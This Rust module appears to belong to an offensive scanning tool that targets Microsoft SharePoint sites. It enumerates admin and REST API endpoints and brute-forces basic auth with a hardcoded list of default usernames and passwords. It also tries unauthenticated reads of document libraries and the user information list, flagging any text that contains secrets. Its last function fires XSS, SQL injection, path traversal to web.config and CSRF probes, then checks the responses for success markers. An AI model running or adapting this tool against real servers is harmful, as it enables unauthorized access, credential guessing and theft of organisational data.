use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SharePoint Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let enum_endpoints = [
        ("/_layouts/15/start.aspx", "SharePoint start"),
        ("/_layouts/15/viewlsts.aspx", "List view"),
        ("/_layouts/15/settings.aspx", "Settings"),
        ("/_layouts/15/people.aspx", "People"),
        ("/_layouts/15/userdisp.aspx", "User display"),
        ("/_layouts/15/groups.aspx", "Groups"),
        ("/_layouts/15/permsetup.aspx", "Permissions setup"),
        ("/_layouts/15/webperm.aspx", "Web permissions"),
        ("/_layouts/15/prjperm.aspx", "Project permissions"),
        ("/_layouts/15/mngsiteadmin.aspx", "Site admins"),
        ("/_layouts/15/mngsubwebs.aspx", "Sub-webs"),
        ("/_layouts/15/sitemanager.aspx", "Site manager"),
        ("/_layouts/15/catman.aspx", "Category manager"),
        ("/_layouts/15/qlrelds.aspx", "Quick launch"),
        ("/_api/web", "REST API - web"),
        ("/_api/web/lists", "REST API - lists"),
        ("/_api/web/webs", "REST API - sub-webs"),
        ("/_api/web/siteusers", "REST API - users"),
        ("/_api/web/sitegroups", "REST API - groups"),
        ("/_api/web/roleassignments", "REST API - roles"),
    ];

    let mut found = 0u32;
    for (path, name) in &enum_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                println!(
                    "  {} {:30} — {} bytes",
                    "[+]".green().bold(),
                    name,
                    text.len()
                );
                found += 1;
            } else if status == 403 {
                println!("  {} {:30} — forbidden", "[!]".yellow().bold(), name);
            }
        }
    }

    println!("\n  {} {} endpoints accessible", "[*]".cyan().bold(), found);

    Ok(())
}

pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SharePoint Credential Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let creds = [
        ("administrator", "password"),
        ("administrator", "P@ssw0rd"),
        ("admin", "admin"),
        ("admin", "password"),
        ("sp_admin", "SharePoint123"),
        ("sp_admin", "SPadmin123"),
        ("svc_sp", "SvcSP123"),
        ("sql_svc", "Sqlpass123"),
        ("user", "user"),
        ("user", "password"),
        ("guest", "guest"),
        ("guest", ""),
    ];

    for (user, pass) in &creds {
        let target = format!("{}/_layouts/15/start.aspx", url.trim_end_matches('/'));
        if let Ok(r) = client
            .get(&target)
            .basic_auth(user, Some(pass))
            .send()
            .await
        {
            let status = r.status().as_u16();
            if status == 200 {
                println!(
                    "  {} {:20}:{:20} — AUTH SUCCESS",
                    "[+]".green().bold(),
                    user,
                    if pass.is_empty() { "(empty)" } else { pass }
                );
            }
        }
    }

    Ok(())
}

pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SharePoint Unauthorized Access", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let access_paths = [
        ("/Shared Documents", "Shared documents"),
        ("/Documents", "Document library"),
        ("/SitePages", "Site pages"),
        ("/Lists", "Lists"),
        ("/_layouts/15/viewlsts.aspx", "All lists"),
        ("/_layouts/15/srchresults.aspx", "Search results"),
        ("/_layouts/15/searchresults.aspx", "Search"),
        ("/_layouts/15/osssearchresults.aspx", "OSS search"),
        (
            "/_api/web/lists/GetByTitle('Documents')/Items",
            "Documents via API",
        ),
        (
            "/_api/web/lists/GetByTitle('Announcements')/Items",
            "Announcements via API",
        ),
        ("/_api/web/lists/GetByTitle('Tasks')/Items", "Tasks via API"),
        (
            "/_api/web/lists/GetByTitle('Calendar')/Items",
            "Calendar via API",
        ),
        ("/_api/web/lists/GetByTitle('Links')/Items", "Links via API"),
        (
            "/_api/web/lists/GetByTitle('User Information List')/Items",
            "User info list",
        ),
    ];

    for (path, name) in &access_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                println!(
                    "  {} {:30} — {} bytes",
                    "[+]".green().bold(),
                    name,
                    text.len()
                );
                if text.contains("password")
                    || text.contains("secret")
                    || text.contains("credential")
                {
                    println!("    {} Sensitive data detected!", "[!]".red().bold());
                }
            }
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SharePoint Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let inject_payloads = [
        (
            "SAML inject",
            "/_layouts/15/error.aspx?ErrorID=<script>alert(1)</script>",
        ),
        (
            "SQLi via param",
            "/_layouts/15/listedit.aspx?List=' OR '1'='1",
        ),
        (
            "XSS in search",
            "/_layouts/15/searchresults.aspx?k=<script>alert(1)</script>",
        ),
        ("Path traversal", "/_layouts/15/../../web.config"),
        (
            "CAML inject",
            "/_api/web/lists/GetByTitle('Documents')/Items?$filter=Title eq 'test'",
        ),
        ("CSRF test", "/_layouts/15/AddApp.aspx?__REQUESTDIGEST=fake"),
    ];

    for (name, path) in &inject_payloads {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200
                    && (text.contains("alert") || text.contains("root:") || text.contains("uid="))
                {
                    println!("  {} {:20} — INJECTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
